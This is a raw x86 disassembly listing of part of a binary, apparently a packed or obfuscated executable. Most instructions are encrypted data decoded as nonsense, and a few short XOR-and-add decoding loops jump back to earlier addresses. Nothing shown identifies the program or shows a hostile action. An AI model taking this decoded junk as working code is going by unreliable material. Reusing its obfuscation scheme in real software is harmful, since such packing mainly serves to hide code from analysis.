  407a7a:	sbb    ecx,DWORD PTR [edx+eiz*1+0x76def8a2]
  407a81:	fimul  DWORD PTR [ebp+0x63]
  407a84:	adc    cl,bh
  407a86:	adc    BYTE PTR [ebx-0x24],bh
  407a89:	ds add al,0x54
  407a8c:	sbb    dh,BYTE PTR [ecx-0x58]
  407a8f:	push   esi
  407a90:	(bad)
  407a94:	push   esp
  407a95:	cmp    bl,ch
  407a97:	nop
  407a98:	int3   
  407a99:	shr    WORD PTR fs:[ecx+0x12],cl
  407a9e:	pop    ebp
  407a9f:	inc    esi
  407aa0:	pop    ebp
  407aa1:	xor    edi,DWORD PTR [ebx+0x32]
  407aa4:	in     al,0xcf
  407aa6:	cmp    bh,ch
  407aa8:	test   BYTE PTR [edx-0x67],ch
  407aab:	sbb    al,0x74
  407aad:	stc    
  407aae:	add    eax,0x6f015680
  407ab3:	stos   BYTE PTR es:[edi],al
  407ab4:	mov    WORD PTR [ebx+0xfa8afc2],fs
  407aba:	lahf   
  407abb:	and    eax,0x911a8222
  407ac0:	add    al,0xe
  407ac2:	mov    ch,0xfa
  407ac4:	test   BYTE PTR [eax+0x7],cl
  407ac7:	and    BYTE PTR [eax],bl
  407ac9:	inc    edx
  407aca:	cmc    
  407acb:	cdq    
  407acc:	or     ebp,DWORD PTR [eax]
  407ace:	ins    DWORD PTR es:[edi],dx
  407acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ad0:	dec    eax
  407ad1:	sbb    eax,0x97cad84a
  407ad6:	push   cs
  407ad7:	(bad)  
  407adb:	aaa    
  407adc:	rcl    bl,0xeb
  407adf:	or     dl,BYTE PTR [edx-0x2]
  407ae2:	fwait
  407ae3:	data16 lahf 
  407ae5:	xor    DWORD PTR [eax-0x1eee1ac3],ebx
  407aeb:	std    
  407aec:	(bad)  
  407aed:	fidiv  DWORD PTR [eax-0x48]
  407af0:	retf   
  407af1:	push   cs
  407af2:	inc    ecx
  407af3:	mov    eax,fs
  407af5:	push   ebp
  407af6:	inc    esi
  407af7:	cmc    
  407af8:	std    
  407af9:	ja     0x407b6a
  407afb:	mov    eax,DWORD PTR [ebp-0x10]
  407afe:	xor    DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	jb     0x407b71
  407b35:	inc    eax
  407b36:	adc    al,0x59
  407b38:	(bad)  
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407b57
  407b40:	loopne 0x407add
  407b42:	sbb    DWORD PTR [esi-0x62],ebp
  407b45:	jmp    0x8799ba75
  407b4a:	xchg   edi,eax
  407b4b:	push   0x7a
  407b4d:	cwde   
  407b4e:	loope  0x407b13
  407b50:	loope  0x407ba4
  407b52:	mov    ah,0x46
  407b54:	mov    esi,0x39e89a28
  407b59:	test   DWORD PTR [edx],esi
  407b5b:	frstor [ebp+0xb]
  407b5e:	push   edx
  407b5f:	mov    edx,DWORD PTR [ecx+0x67fe7a5e]
  407b65:	or     al,0x7d
  407b67:	enter  0xfc9a,0x73
  407b6b:	loopne 0x407bb8
  407b6d:	or     al,0x66
  407b6f:	xlat   BYTE PTR ds:[ebx]
  407b70:	cmp    al,0x9f
  407b72:	pop    es
  407b73:	test   bh,ch
  407b75:	push   esp
  407b76:	push   eax
  407b77:	call   0xbc6c:0x29514ec
  407b7e:	sub    ebp,edi
  407b80:	mov    ecx,0x33fca359
  407b85:	add    edi,DWORD PTR [edx]
  407b87:	cld    
  407b88:	rol    DWORD PTR [ecx],0xc4
  407b8b:	sbb    BYTE PTR [ebp-0x4],dh
  407b8e:	aas    
  407b8f:	or     al,0x93
  407b91:	retf   0x5d37
  407b94:	push   edi
  407b95:	mov    al,0xe6
  407b97:	lock jns 0x407b39
  407b9a:	leave  
  407b9b:	imul   ecx,DWORD PTR [edi-0x41],0x35
  407b9f:	fs fnclex 
  407ba2:	popa   
  407ba3:	dec    ebp
  407ba4:	out    0x8,al
  407ba6:	pop    edx
  407ba7:	in     eax,0xd0
  407ba9:	daa    
  407baa:	cmp    eax,0x6c23f9fb
  407baf:	jl     0x407b89
  407bb1:	inc    esp
  407bb2:	sbb    BYTE PTR [edx],ah
  407bb4:	ret    0xe605
  407bb7:	sub    BYTE PTR [ebx],ch
  407bb9:	sbb    DWORD PTR ds:0xadc9ae19,edx
  407bbf:	rol    BYTE PTR [eax-0x3d],0xd5
  407bc3:	repz jecxz 0x407ba9
  407bc6:	lods   eax,DWORD PTR ds:[esi]
  407bc7:	shl    DWORD PTR [eax+0x41bc983c],cl
  407bcd:	jl     0x407bb3
  407bcf:	mov    esp,edx
  407bd1:	ret    
  407bd2:	aad    0x35
  407bd4:	push   ds
  407bd5:	inc    eax
  407bd6:	idiv   DWORD PTR [edi]
  407bd8:	xchg   ecx,eax
  407bd9:	cmp    al,0xc1
  407bdb:	pop    eax
  407bdc:	lds    ebx,FWORD PTR [eax+0x38]
  407bdf:	mov    edx,DWORD PTR [esi-0x10b70cb7]
  407be5:	or     BYTE PTR [eax],ch
  407be7:	and    eax,0x865046b7
  407bec:	aam    0x3a
  407bee:	xchg   esp,eax
  407bef:	sbb    DWORD PTR [ebp+ecx*4+0x592834e6],edi
  407bf6:	sbb    al,0xa4
  407bf8:	lahf   
  407bf9:	out    dx,al
  407bfa:	pop    edx
  407bfb:	je     0x407c57
  407bfd:	cld    
  407bfe:	mov    ch,0x6d
  407c00:	sub    BYTE PTR [ebp+0x2b],ch
  407c03:	push   esi
  407c04:	sahf   
  407c05:	(bad)  
  407c06:	sbb    BYTE PTR [ecx-0x6b],bh
  407c09:	loopne 0x407bb7
  407c0b:	push   es
  407c0c:	push   ebp
  407c0d:	es dec eax
  407c0f:	add    esp,DWORD PTR [ebp-0x5d712d09]
  407c15:	mov    bh,0x11
  407c17:	adc    eax,0x5a6216a4
  407c1c:	aad    0xc6
  407c1e:	sub    al,0x8d
  407c20:	sub    al,0xfa
  407c22:	jns    0x407bf2
  407c24:	mov    bl,0x1f
  407c26:	sbb    ecx,DWORD PTR [ebx+0x1d6f6acb]
  407c2c:	pop    es
  407c2d:	mov    ecx,eax
  407c2f:	cwde   
  407c30:	in     al,dx
  407c31:	loop   0x407bfc
  407c33:	stc    
  407c34:	push   ebx
  407c35:	pop    edi
  407c36:	or     al,0xb3
  407c38:	fdivrp st(0),st
  407c3a:	xor    DWORD PTR [edx-0x53205db9],esp
  407c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c41:	(bad)  
  407c42:	imul   eax,DWORD PTR [eax+ecx*1+0x30],0x7c
  407c47:	fimul  WORD PTR fs:[edx-0x2f369393]
  407c4e:	fs lock push edi
  407c51:	mov    eax,0x75129aa8
  407c56:	rcr    BYTE PTR [eax+0x1fd37ea],cl
  407c5c:	aas    
  407c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c5f:	mov    ah,0xe0
  407c61:	and    edx,DWORD PTR [eax]
  407c63:	push   edi
  407c64:	or     ch,BYTE PTR [ebx]
  407c66:	mov    ds:0xb11e6708,al
  407c6b:	rol    al,0xe9
  407c6e:	into   
  407c6f:	add    DWORD PTR [edx+0x2d05725a],eax
  407c75:	pushf  
  407c76:	or     BYTE PTR [edx+0x29],ch
  407c79:	sar    DWORD PTR [eax],cl
  407c7b:	or     al,0x8e
  407c7d:	dec    ebx
  407c7e:	aas    
  407c7f:	jae    0x407ce2
  407c81:	cmp    DWORD PTR [eax+0x62],edx
  407c84:	nop
  407c85:	leave  
  407c86:	aad    0xa6
  407c88:	sbb    bl,al
  407c8a:	xor    DWORD PTR [edx],esi
  407c8c:	xchg   edx,eax
  407c8d:	xor    eax,0xf319e402
  407c92:	mov    cl,dh
  407c94:	inc    eax
  407c95:	loop   0x407cc8
  407c97:	mov    ecx,0x4f434730
  407c9c:	cmc    
  407c9d:	shl    BYTE PTR [esp+ecx*2-0x4d],0xf3
  407ca2:	mov    bh,0x6a
  407ca4:	sub    al,0x4c
  407ca6:	jbe    0x407cf8
  407ca8:	and    esi,esi
  407caa:	daa    
  407cab:	div    dl
  407cad:	or     edi,DWORD PTR [ecx+0x48]
  407cb0:	hlt    
  407cb1:	pop    edi
  407cb2:	mov    eax,0xc6aee5aa
  407cb7:	ins    BYTE PTR es:[edi],dx
  407cb8:	outs   dx,DWORD PTR ds:[esi]
  407cb9:	in     eax,0x67
  407cbb:	dec    ebx
  407cbc:	nop
  407cbd:	xor    eax,0xe598cbd0
  407cc2:	es and edx,ecx
  407cc5:	cs jo  0x407c6b
  407cc8:	cmc    
  407cc9:	add    di,WORD PTR [ebp+0x28]
  407ccd:	aad    0x20
  407ccf:	sub    eax,DWORD PTR [esi+0x1b]
  407cd2:	mov    dh,0x18
  407cd4:	retf   0xdbbc
  407cd7:	cwde   
  407cd8:	cmp    ebx,DWORD PTR [ebx+eiz*8]
  407cdb:	adc    eax,0xde20e61c
  407ce0:	or     eax,0xfd86615
  407ce5:	loope  0x407d61
  407ce7:	jle    0x407c79
  407ce9:	jno    0x407d19
  407ceb:	push   es
  407cec:	rol    BYTE PTR [ecx],1
  407cee:	cwde   
  407cef:	push   ss
  407cf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cf1:	in     eax,0xd9
  407cf3:	enter  0xbbd9,0x8f
  407cf7:	ret    
  407cf8:	ds mov ecx,0x3ff3ffb
  407cfe:	jne    0x407caa
  407d00:	icebp  
  407d01:	push   ds
  407d02:	retf   
  407d03:	jmp    0x396b:0x3bf9c182
  407d0a:	nop
  407d0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d0c:	shr    BYTE PTR [edx],1
  407d0e:	and    bh,dl
  407d10:	int    0x54
  407d12:	pop    ebx
  407d13:	stos   BYTE PTR es:[edi],al
  407d14:	mov    cl,0xfb
  407d16:	das    
  407d17:	cmp    eax,0x416761dc
  407d1c:	mov    al,ds:0x91c4741c
  407d21:	retf   
  407d22:	adc    al,0xe6
  407d24:	inc    ebp
  407d25:	inc    edi
  407d26:	mov    ds:0x4665b55b,al
  407d2b:	add    al,BYTE PTR [eax]
  407d2d:	shr    DWORD PTR [ecx-0x8d525da],0x66
  407d34:	sub    eax,0xa2e212ea
  407d39:	sbb    al,0xfe
  407d3b:	mov    esi,0x223ac1b1
  407d40:	jp     0x407cd0
  407d42:	pop    esi
  407d43:	bound  eax,QWORD PTR [edi+0x52b200d7]
  407d49:	outs   dx,BYTE PTR ds:[esi]
  407d4a:	ficom  WORD PTR [esi+0x77]
  407d4d:	pop    esi
  407d4e:	mov    edi,DWORD PTR [edi+eax*8-0x2e]
  407d52:	div    esp
  407d54:	mov    ds:0xbf7ff0bb,eax
  407d59:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d5b:	and    DWORD PTR [esi-0x2a],ebp
  407d5e:	mov    ch,0x84
  407d60:	push   cs
  407d61:	mov    eax,ds:0x4f5b3b7e
  407d66:	fiadd  WORD PTR [ebp+0x2b86d5dc]
  407d6c:	ret    0x6bb3
  407d6f:	call   0xfc2:0x696fb9c
  407d76:	loope  0x407d64
  407d78:	mov    ecx,0x7a511f80
  407d7d:	mov    bl,0xd
  407d7f:	mov    ebp,0xd68f4589
  407d84:	fwait
  407d85:	sub    al,0xea
  407d87:	dec    ecx
  407d88:	jb     0x407d13
  407d8a:	or     BYTE PTR ds:0x3bfb1ccd,cl
  407d90:	or     al,0xcb
  407d92:	push   esp
  407d93:	or     BYTE PTR [edx-0x42],cl
  407d96:	shr    DWORD PTR [eax],0x59
  407d99:	xchg   BYTE PTR [esi*8-0x13963ce],al
  407da0:	add    BYTE PTR [ebx],bh
  407da2:	mov    ds:0xa1b0ca8d,al
  407da7:	cmc    
  407da8:	ficomp WORD PTR [edx+0x34]
  407dab:	xchg   edx,eax
  407dac:	leave  
  407dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dae:	mov    ds:0x369e1b2c,eax
  407db3:	dec    ebp
  407db4:	sub    BYTE PTR [edx-0x63e95c34],dl
  407dba:	or     al,0xe
  407dbc:	mov    DWORD PTR [ecx+0x4974c71e],eax
  407dc2:	loop   0x407d6a
  407dc4:	and    DWORD PTR [edi+0x484be39a],0xffffff8a
  407dcb:	xlat   BYTE PTR ds:[ebx]
  407dcc:	jecxz  0x407e06
  407dce:	dec    esp
  407dcf:	ds in  eax,dx
  407dd1:	xlat   BYTE PTR ds:[ebx]
  407dd2:	lahf   
  407dd3:	and    BYTE PTR [ebp+0x47],al
  407dd6:	or     dl,al
  407dd8:	sbb    dl,ch
  407dda:	cmp    ch,ah
  407ddc:	neg    dh
  407dde:	xchg   esp,eax
  407ddf:	inc    esi
  407de0:	cs aaa 
  407de2:	stos   DWORD PTR es:[edi],eax
  407de3:	push   0x88c29afd
  407de8:	mov    eax,ds:0x2a72d2cc
  407ded:	add    BYTE PTR [esp+edi*4],bh
  407df0:	cmp    al,0x76
  407df2:	jp     0x407d87
  407df4:	push   0x3c23f4bd
  407df9:	jns    0x407e4a
  407dfb:	xchg   edi,eax
  407dfc:	xchg   esp,eax
  407dfd:	inc    ecx
  407dfe:	sbb    al,BYTE PTR [ebp-0x67]
  407e01:	push   ss
  407e02:	sub    bl,BYTE PTR [edi+0x20]
  407e05:	mov    ecx,0x2ab02052
  407e0a:	mov    bh,0x4f
  407e0c:	jns    0x407e36
  407e0e:	stos   DWORD PTR es:[edi],eax
  407e0f:	nop
  407e10:	pop    edx
  407e11:	push   ss
  407e12:	test   eax,0x7b81a40f
  407e17:	cmp    esp,DWORD PTR [edx-0x23]
  407e1a:	mov    al,ds:0xa0be2eef
  407e1f:	adc    dl,BYTE PTR [ebx+0x3d]
  407e22:	push   ebp
  407e23:	dec    eax
  407e24:	lods   eax,DWORD PTR ds:[esi]
  407e25:	cli    
  407e26:	xor    DWORD PTR [ecx-0x15cfda5f],edx
  407e2c:	xor    BYTE PTR [ecx-0x3b0e5a2f],cl
  407e32:	aad    0xe8
  407e34:	jae    0x407e13
  407e36:	sbb    BYTE PTR fs:[edi+esi*4],bh
  407e3a:	pop    edi
  407e3b:	cmp    al,0x78
  407e3d:	bound  edi,QWORD PTR [eax-0x28]
  407e40:	rol    DWORD PTR [ecx+eiz*1],1
  407e43:	pushf  
  407e44:	mov    ds:0x3dd8002b,eax
  407e49:	xchg   esi,eax
  407e4a:	sti    
  407e4b:	push   esp
  407e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e4d:	add    eax,0xd1b5360e
  407e52:	push   ebp
  407e53:	not    DWORD PTR [ebx+0x33bdfe91]
  407e59:	jp     0x407e8b
  407e5b:	dec    edi
  407e5c:	xchg   DWORD PTR [edx-0x7837c6cb],ebp
  407e62:	xor    ecx,edi
  407e64:	ret    
  407e65:	or     al,0xc7
  407e67:	add    al,0x3e
  407e69:	jo     0x407e78
  407e6b:	sbb    al,0xb9
  407e6d:	lods   eax,DWORD PTR ds:[esi]
  407e6e:	and    al,0x2e
  407e70:	adc    BYTE PTR es:[ebx-0x658625bc],ah
  407e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e78:	push   edx
  407e79:	mov    bl,0x64
  407e7b:	cmp    eax,0x5ecb86d8
  407e80:	adc    BYTE PTR [edi],al
  407e82:	push   ecx
  407e83:	cmc    
  407e84:	aam    0x58
  407e86:	sbb    BYTE PTR [eax],0x37
  407e89:	cld    
  407e8a:	(bad)  
  407e8b:	stos   DWORD PTR es:[edi],eax
  407e8c:	mov    cl,0x9d
  407e8e:	fld    QWORD PTR [ebp+0x7f]
  407e91:	cmp    al,0x6a
  407e93:	sbb    edx,DWORD PTR [eax+ebx*2]
  407e96:	add    DWORD PTR [edi+0x15],0xffffff88
  407e9a:	xchg   edi,eax
  407e9b:	mov    al,ds:0xd3259732
  407ea0:	test   al,0x58
  407ea2:	fwait
  407ea3:	aad    0x3f
  407ea5:	mul    dh
  407ea7:	imul   esi,esp,0xffffff83
  407eaa:	push   ebx
  407eab:	mov    WORD PTR [edx+eax*1+0x6e],ss
  407eaf:	push   ebx
  407eb0:	sub    eax,0x9fd825bf
  407eb5:	jno    0x407eae
  407eb7:	xlat   BYTE PTR ds:[ebx]
  407eb8:	push   ebp
  407eb9:	int3   
  407eba:	mov    ecx,0x1adcf73a
  407ebf:	xor    BYTE PTR ds:0xe59e3865,al
  407ec5:	push   ds
  407ec6:	outs   dx,BYTE PTR ds:[esi]
  407ec7:	xor    bl,al
  407ec9:	aas    
  407eca:	push   ebp
  407ecb:	adc    ecx,DWORD PTR [edi]
  407ecd:	jecxz  0x407ea0
  407ecf:	outs   dx,BYTE PTR ds:[esi]
  407ed0:	mov    ds:0x2347755f,al
  407ed5:	push   ecx
  407ed6:	push   ebx
  407ed7:	es push eax
  407ed9:	aad    0x99
  407edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407edc:	in     al,dx
  407edd:	pop    edi
  407ede:	call   0x1dec74de
  407ee3:	add    esi,ebx
  407ee5:	fmul   DWORD PTR [ecx-0x5d]
  407ee8:	sub    esi,edi
  407eea:	fsub   st(2),st
  407eec:	shl    cl,cl
  407eee:	add    dl,dh
  407ef0:	mov    dh,0x9b
  407ef2:	ret    
  407ef3:	push   ecx
  407ef4:	cli    
  407ef5:	jnp    0x407e92
  407ef7:	ret    
  407ef8:	aam    0x28
  407efa:	sbb    al,0x89
  407efc:	je     0x407f23
  407efe:	lods   eax,DWORD PTR ds:[esi]
  407eff:	mov    edi,DWORD PTR [eax]
  407f01:	push   cs
  407f02:	jecxz  0x407e9c
  407f04:	xor    eax,edx
  407f06:	xor    DWORD PTR [edx-0x72],0xaae75acc
  407f0d:	cwde   
  407f0e:	pop    edi
  407f0f:	out    0x66,eax
  407f11:	cmp    eax,DWORD PTR [edi]
  407f13:	je     0x407f60
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407fa1
  407f78:	add    DWORD PTR [eax+0x7ed2aa14],esp
  407f7e:	jle    0x407fcf
  407f80:	jns    0x408000
  407f82:	jle    0x407f12
  407f84:	adc    bh,BYTE PTR ds:0xfc756dd2
  407f8a:	add    DWORD PTR [ebx+edx*1-0x6e468a4f],ebx
  407f91:	rcr    DWORD PTR [ebx+eax*8-0x42],1
  407f95:	aaa    
  407f96:	mov    ebx,DWORD PTR ds:0xfa2f279f
  407f9c:	push   eax
  407f9d:	loopne 0x407f44
  407f9f:	add    esp,edx
  407fa1:	jae    0x407f88
  407fa3:	fsub   DWORD PTR [ecx-0x76]
  407fa6:	sahf   
  407fa7:	nop
  407fa8:	jno    0x407fd8
  407faa:	push   edx
  407fab:	retf   
  407fac:	mov    eax,0x29840de4
  407fb1:	int    0x81
  407fb3:	pop    es
  407fb4:	je     0x407ff8
  407fb6:	dec    eax
  407fb7:	or     dl,dh
  407fb9:	xchg   ecx,eax
  407fba:	call   0x1afd8e9d
  407fbf:	pop    edi
  407fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fc2:	mov    bl,0xea
  407fc4:	mov    dh,0x56
  407fc6:	mov    esi,0xe9aa1d23
  407fcb:	das    
  407fcc:	mov    dh,0xdd
  407fce:	inc    eax
  407fcf:	mov    ebp,DWORD PTR [edx+ecx*4-0x36]
  407fd3:	adc    DWORD PTR [edx-0x66],0xfffffff1
  407fd7:	xor    edi,DWORD PTR [ecx]
  407fd9:	cmc    
  407fda:	push   ebx
  407fdb:	popf   
  407fdc:	sub    ebx,DWORD PTR ds:0xc592aca6
  407fe2:	sar    ebp,1
  407fe4:	cdq    
  407fe5:	push   eax
  407fe6:	inc    edx
  407fe7:	sbb    al,0x48
  407fe9:	rcr    DWORD PTR [edx-0x312e50f4],1
  407fef:	clc    
  407ff0:	mov    DWORD PTR [edx],ebp
  407ff2:	sub    DWORD PTR [ebx+0x25],ebp
  407ff5:	(bad)  
  407ff7:	mov    BYTE PTR [esi+0x56007ce3],bh
  407ffd:	cmp    esi,ebx
  407fff:	mov    esp,0xaa67cf7e
  408004:	(bad)  
  408005:	sbb    al,0x88
  408007:	push   ecx
  408008:	inc    ax
  40800a:	sbb    BYTE PTR [edx+0x45eedcd4],dl
  408010:	pop    esi
  408011:	loopne 0x408020
  408013:	fstp   DWORD PTR [ecx+eax*8-0x6d]
  408017:	stos   DWORD PTR es:[edi],eax
  408018:	adc    esi,eax
  40801a:	push   esi
  40801b:	sbb    eax,0x9bd28cee
  408020:	popa   
  408021:	cmc    
  408022:	loope  0x40804f
  408024:	cmp    dl,BYTE PTR [ebx+edi*8-0x46]
  408028:	mov    esp,0x3f519058
  40802d:	leave  
  40802e:	mov    dh,0x38
  408030:	lahf   
  408031:	dec    eax
  408032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408033:	stos   DWORD PTR es:[edi],eax
  408034:	mov    ebx,eax
  408036:	pop    ds
  408037:	fisttp QWORD PTR [edx+0x6badb696]
  40803d:	out    dx,eax
  40803e:	aad    0x61
  408040:	ja     0x6a04bf33
  408046:	or     al,0x2
  408048:	jno    0x407ff8
  40804a:	retf   0x3151
  40804d:	pusha  
  40804e:	pusha  
  40804f:	retf   0x4346
  408052:	mov    dl,0x7b
  408054:	pop    edx
  408055:	(bad)  
  408056:	cld    
  408057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408058:	xor    eax,0x8468594b
  40805d:	leave  
  40805e:	jo     0x7bf22a31
  408064:	mov    cl,0xae
  408066:	pop    ds
  408067:	int3   
  408068:	stos   DWORD PTR es:[edi],eax
  408069:	add    DWORD PTR [ebp+0x5c],ecx
  40806c:	xlat   BYTE PTR ds:[ebx]
  40806d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40806e:	outs   dx,DWORD PTR ds:[esi]
  40806f:	pushf  
  408070:	enter  0x3e4a,0x26
  408074:	popf   
  408075:	mov    edi,0x1f325e50
  40807a:	cmp    BYTE PTR [ecx+0x7],ah
  40807d:	rol    DWORD PTR [ebx+0x52],cl
  408080:	mov    al,ds:0x19b239e
  408085:	jg     0x408026
  408087:	sbb    dl,BYTE PTR [ebx+0x33472574]
  40808d:	popf   
  40808e:	cmp    eax,0xb55ffb6
  408093:	rcl    ch,0xaa
  408096:	xchg   BYTE PTR [eax],al
  408098:	mov    esi,0x77fb7924
  40809d:	jge    0x40801f
  40809f:	clc    
  4080a0:	push   0x52
  4080a2:	and    dh,bh
  4080a4:	pop    ebp
  4080a5:	into   
  4080a6:	xchg   DWORD PTR [eax],esp
  4080a8:	mov    esi,0xbe842aa2
  4080ad:	mov    dh,0xc0
  4080af:	lods   eax,DWORD PTR ds:[esi]
  4080b0:	loopne 0x4080e2
  4080b2:	and    BYTE PTR [ecx-0x1b],ah
  4080b5:	sahf   
  4080b6:	je     0x408084
  4080b8:	or     al,0xb
  4080ba:	(bad)  
  4080bb:	out    0xed,eax
  4080bd:	lods   eax,DWORD PTR ds:[esi]
  4080be:	lods   eax,DWORD PTR ds:[esi]
  4080bf:	adc    al,0x97
  4080c1:	xlat   BYTE PTR ds:[ebx]
  4080c2:	fisub  DWORD PTR [ebx-0x2]
  4080c5:	mov    dl,0x96
  4080c7:	clc    
  4080c8:	out    dx,eax
  4080c9:	mov    esi,0xe11927e7
  4080ce:	cmp    esp,DWORD PTR [ebx-0x31]
  4080d1:	lods   al,BYTE PTR ds:[esi]
  4080d2:	ds inc ecx
  4080d4:	pop    esi
  4080d5:	xor    BYTE PTR [ebx-0x63],dh
  4080d8:	or     DWORD PTR [edx-0x5d2e6935],edx
  4080de:	fisttp WORD PTR [ebx]
  4080e0:	xor    DWORD PTR [edx+ebp*2+0x26],0x18
  4080e5:	rcl    BYTE PTR [ebx-0x7b],cl
  4080e8:	call   0x4ac275b7
  4080ed:	int3   
  4080ee:	pop    ds
  4080ef:	mov    esi,0x97283eb8
  4080f4:	ds addr16 adc eax,0xd36e55bf
  4080fb:	or     DWORD PTR [esi-0x4f489f38],esi
  408101:	das    
  408102:	(bad)  [esp+esi*1-0x183d4c5a]
  408109:	dec    edx
  40810a:	loop   0x408132
  40810c:	sahf   
  40810d:	leave  
  40810e:	sbb    bh,BYTE PTR [eax]
  408110:	sar    bh,cl
  408112:	ins    DWORD PTR es:[edi],dx
  408113:	pop    ds
  408114:	mov    DWORD PTR [ecx+0xfdbc60f],ebp
  40811a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40811b:	adc    ebx,edx
  40811d:	(bad)  
  40811e:	and    ch,bl
  408120:	pop    es
  408121:	xchg   ebp,eax
  408122:	or     eax,eax
  408124:	push   esp
  408125:	mov    edi,0x9af99f4b
  40812a:	cwde   
  40812b:	cdq    
  40812c:	xchg   edx,eax
  40812d:	add    DWORD PTR [ecx+0x6592e84e],0x49
  408134:	lea    ecx,[esi-0x2d]
  408137:	mov    esi,0xddb83a5e
  40813c:	inc    esp
  40813d:	addr16 sti 
  40813f:	repz stc 
  408141:	mov    ebp,0xa4a5750d
  408146:	(bad)  
  408147:	mov    ch,0x55
  408149:	pop    ebx
  40814a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40814b:	idiv   DWORD PTR [edi]
  40814d:	out    0xcd,al
  40814f:	repnz adc eax,0x28d72403
  408155:	popa   
  408156:	push   ds
  408157:	sub    BYTE PTR [ecx+0x55],0xb6
  40815b:	rcl    al,1
  40815d:	jo     0x40814a
  40815f:	jge    0x408178
  408161:	or     DWORD PTR [edi-0x1fce0d4f],edi
  408167:	and    eax,0x8804181
  40816c:	inc    esi
  40816d:	in     al,0x20
  40816f:	jmp    0x408139
  408171:	or     al,0xc6
  408173:	xor    cl,BYTE PTR [ebp+0x63c943c8]
  408179:	pop    eax
  40817a:	imul   ah
  40817c:	dec    eax
  40817d:	addr16 leave 
  40817f:	cld    
  408180:	jge    0x408143
  408182:	mov    ecx,0x1d2f4f5b
  408187:	push   esp
  408188:	loop   0x408183
  40818a:	pop    edi
  40818b:	fcomp  QWORD PTR [ebx-0x32ff9f86]
  408191:	inc    ecx
  408192:	mov    ecx,0xfa329f0a
  408197:	je     0x4081fe
  408199:	loopne 0x408163
  40819b:	fnstsw WORD PTR [edi+0x64d33021]
  4081a1:	es int 0xfd
  4081a4:	add    BYTE PTR [edx],0xbd
  4081a7:	mov    ecx,0x97d1aac9
  4081ac:	in     eax,0x80
  4081ae:	mov    dl,BYTE PTR [ecx+0x1578bb64]
  4081b4:	or     BYTE PTR [eax+0x30],bh
  4081b7:	scas   al,BYTE PTR es:[edi]
  4081b8:	bound  edi,QWORD PTR [eax]
  4081ba:	xchg   esp,eax
  4081bb:	(bad)  
  4081bc:	dec    esp
  4081bd:	aas    
  4081be:	sbb    DWORD PTR [ebx-0x7b],0xffffffaf
  4081c2:	push   es
  4081c3:	dec    ebx
  4081c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081c5:	and    dh,BYTE PTR [eax-0x71]
  4081c8:	outs   dx,BYTE PTR ds:[esi]
  4081c9:	mov    ebp,0xa13710e7
  4081ce:	hlt    
  4081cf:	imul   esp,ecx,0x3743cfb5
  4081d5:	popa   
  4081d6:	inc    ebx
  4081d7:	push   es
  4081d8:	cwde   
  4081d9:	jge    0x4081b3
  4081db:	(bad)  
  4081dc:	rcl    DWORD PTR [ebp+0x5a],0x5a
  4081e0:	pop    eax
  4081e1:	xor    DWORD PTR [esi+0x56],edi
  4081e4:	sbb    BYTE PTR [ecx+0x4c],bl
  4081e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081e8:	cmp    al,0x89
  4081ea:	fidivr WORD PTR [edx]
  4081ec:	scas   eax,DWORD PTR es:[edi]
  4081ed:	fimul  WORD PTR fs:[edi-0x739ddf61]
  4081f4:	lock xor cl,BYTE PTR [ebx]
